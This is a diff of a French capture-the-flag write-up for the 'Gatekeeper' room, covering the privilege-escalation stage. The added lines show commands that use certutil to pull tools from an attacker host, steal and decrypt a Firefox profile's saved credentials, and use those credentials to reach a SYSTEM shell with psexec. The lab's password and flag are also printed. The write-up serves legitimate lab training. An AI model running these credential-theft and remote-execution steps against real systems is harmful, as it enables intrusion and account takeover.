@@ -469,12 +469,19 @@ The buffer overflow in this room is credited to Justin Steven and his
 
 ## Elevation de privilèges
 
-WinPEAS.bat
+### WinPEAS
 
-
+```
 certutil.exe -urlcache -split -f http://10.9.11.184/winPEAS.bat
+```
 
+=> RAS
 
+### Vol des login/pass du profil firefox
+
+Où est sont stocké les profils Firefox ?
+
+```
 C:\Users\natbat>dir key4.db /s
 dir key4.db /s
  Volume in drive C has no label.
@@ -484,25 +491,27 @@ dir key4.db /s
 
 04/21/2020  05:02 PM           294,912 key4.db
                1 File(s)        294,912 bytes
+```
 
+> C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
 
-copy key4.db \Users\Share
-copy cert9.db \Users\Share
-copy logins.json \Users\Share
-copy cookies.sqlite \Users\Share
+Téléchargement de 7-zip
 
+```
+certutil.exe -urlcache -split -f http://10.9.11.184/7za.exe
+```
+
+Compression du profil FF
+
+```
+7za.exe a -tzip ff.zip C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\*.*
+```
+
+Decryptage
 
 https://github.com/unode/firefox_decrypt
 
-C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
-
-
-certutil.exe -urlcache -split -f http://10.9.11.184/7za.exe
-
-
-7za.exe a -tzip ff.zip C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\*.*
-
-
+```sh
 kali@kali:~/thm/gatekeeper/smb$ firefox_decrypt.py ff/
 2020-07-09 16:48:53,235 - WARNING - profile.ini not found in ff/
 2020-07-09 16:48:53,235 - WARNING - Continuing and assuming 'ff/' is a profile location
@@ -513,9 +522,9 @@ Master Password for profile ff/:
 Website:   https://creds.com
 Username: 'mayor'
 Password: '8CL7O1N78MdrCIsV'
+```
 
-
-
+```
 kali@kali:~/thm/gatekeeper/smb$ smbclient -U mayor //10.10.233.170/Users
 Enter WORKGROUP\mayor's password: 
 Try "help" to get a list of possible commands.
@@ -543,9 +552,38 @@ smb: \mayor\Desktop\> dir
 		7863807 blocks of size 4096. 3856718 blocks available
 smb: \mayor\Desktop\> get root.txt.txt
 getting file \mayor\Desktop\root.txt.txt of size 27 as root.txt.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
+```
 
+```
+kali@kali:~/thm/gatekeeper/smb$ cat root.txt.txt 
+{Th3_M4y0r_C0ngr4tul4t3s_U}
+```
 
+Installation de Impacket
+
+```
+git clone https://github.com/SecureAuthCorp/impacket.git
+cd impacket
+pip install .
+```
+
+```
 psexec.py mayor:8CL7O1N78MdrCIsV@10.10.233.170 cmd -path c:\\windows\\system32\\
+Impacket v0.9.22.dev1+20200629.145357.5d4ad6cc - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.233.170.....
+[*] Found writable share ADMIN$
+[*] Uploading file LAooGvEo.exe
+[*] Opening SVCManager on 10.10.233.170.....
+[*] Creating service ByDX on 10.10.233.170.....
+[*] Starting service ByDX.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+c:\windows\system32>whoami
+nt authority\system
+```
 
 
 ## Sources:
